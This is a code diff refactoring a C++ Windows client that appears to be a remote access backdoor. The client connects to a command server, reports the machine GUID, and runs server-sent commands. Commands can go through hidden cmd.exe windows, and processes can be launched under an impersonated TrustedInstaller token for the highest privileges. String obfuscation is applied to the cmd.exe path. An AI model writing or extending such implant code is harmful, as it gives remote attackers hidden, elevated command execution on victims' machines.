@@ -80,7 +80,7 @@ BOOL Client::Connect() {
 	if ( connect == SOCKET_ERROR )
 		return FALSE;
 	OutputDebugStringA("socket");
-
+		
 	RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
 	this->SetRequestSecrets(keys);
 
@@ -158,8 +158,30 @@ BOOL Client::SendMachineGUIDToServer() {
 	return SendMessageToServer(this->m_MachineGUID, TRUE);
 }
 
-BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outResponse) {
-	BOOL success = FALSE;
+const CMDDESC Client::CreateCommandDescription(const Packet& command) {
+	std::string buffer(command.buffer, command.buffLen);
+	
+	CMDDESC description;
+	description.respondToServer = ( command.flags & RESPOND_WITH_STATUS );
+	description.creationFlags   = ( command.flags & NO_CONSOLE ) ? CREATE_NO_WINDOW : CREATE_NEW_CONSOLE;
+	description.application     = std::wstring(buffer.begin(), buffer.end()); // default application to run is wtv in command buffer
+
+	if ( command.flags & RUN_AS_HIGHEST && this->m_ProcMgr.GetProcessSecurityContext() < SecurityContext::Highest )
+		this->m_ProcMgr.GetTrustedInstallerToken();
+
+	if ( command.flags & USE_CLI ) { 
+		description.application = std::wstring(HIDE(L"C:\\Windows\\System32\\cmd.exe")); // use cmd.exe
+		description.commandArgs += std::wstring(buffer.begin(), buffer.end()); // buffer are the command line args
+	}
+
+	description.creationContext = this->m_ProcMgr.GetToken();
+
+	return description;
+}
+
+BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) {
+	BOOL	success		= FALSE;
+	CMDDESC description = CreateCommandDescription(command);
 
 	switch ( command.action ) {
 	case RemoteAction::kPingClient:
@@ -168,52 +190,31 @@ BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outRes
 	case RemoteAction::kOpenRemoteProcess:
 		CLIENT_DBG("opening elevated process");
 
-		STARTUPINFO si = { 0 };
-		PROCESS_INFORMATION pi = { 0 };
-		uint32_t creationFlags = NULL;
-		HANDLE context = NULL;
-		std::string application = ""; // no application
+		STARTUPINFO			si = {};
+		PROCESS_INFORMATION pi = {};
 
-		if ( command.flags & NO_CONSOLE ) {
-			si.wShowWindow = SW_HIDE;
-			si.dwFlags = STARTF_USESHOWWINDOW;
-		}
-		else if ( ( command.flags & NO_CONSOLE ) == 0 ) // show console
-			creationFlags |= CREATE_NEW_CONSOLE;
-
-		if ( command.flags & RUN_AS_NORMAL )
-			context = this->m_ProcMgr.GetToken();
-		else if ( command.flags & RUN_AS_HIGHEST ) 
-			context = this->m_ProcMgr.GetTrustedInstallerToken();
-
-		if ( command.flags & USE_CLI ) {
-			application = std::string(HIDE("\"C:\\Windows\\System32\\cmd.exe\"")); // use cmd.exe
-			// buffer are the command line args
-			std::string cla(command.buffer, command.buffLen);
-			application += " ";
-			application += cla;
-		}
-		else if ( ( command.flags & USE_CLI ) == 0 ) // opening regular process
-			application = std::string(command.buffer, command.buffLen);
+		CLIENT_DBG(std::string(description.application.begin(), description.application.end()).c_str());
+		CLIENT_DBG(std::string(description.commandArgs.begin(), description.commandArgs.end()).c_str());
 
 		success = this->m_ProcMgr.OpenProcessAsImposter(
-			this->m_ProcMgr.GetTrustedInstallerToken(),
+			description.creationContext,
 			0,
-			NULL,
-			std::wstring(application.begin(), application.end()).data(),
-			creationFlags,
+			description.application.data(),
+			description.commandArgs.data(),
+			description.creationFlags,
 			NULL,
 			NULL,
 			&si,
 			&pi
 		);
 
-		CLIENT_DBG("opened...");
+		if ( success == TRUE )
+			CLIENT_DBG("opened...");
 
 		break;
 	}
 
-	if ( command.flags & RESPOND_WITH_STATUS ) {
+	if ( description.respondToServer ) {
 		outResponse.actionPerformed = command.action;
 		outResponse.responseCode = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
 	}
@@ -221,7 +222,7 @@ BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outRes
 	return success;
 }
 
-BOOL Client::IsServerAwaitingResponse(const ServerCommand& commandPerformed) {
+BOOL Client::IsServerAwaitingResponse(const Packet& commandPerformed) {
 	BOOL sendResponse = FALSE;
 	switch ( commandPerformed.action ) {
 	case RemoteAction::kPingClient:
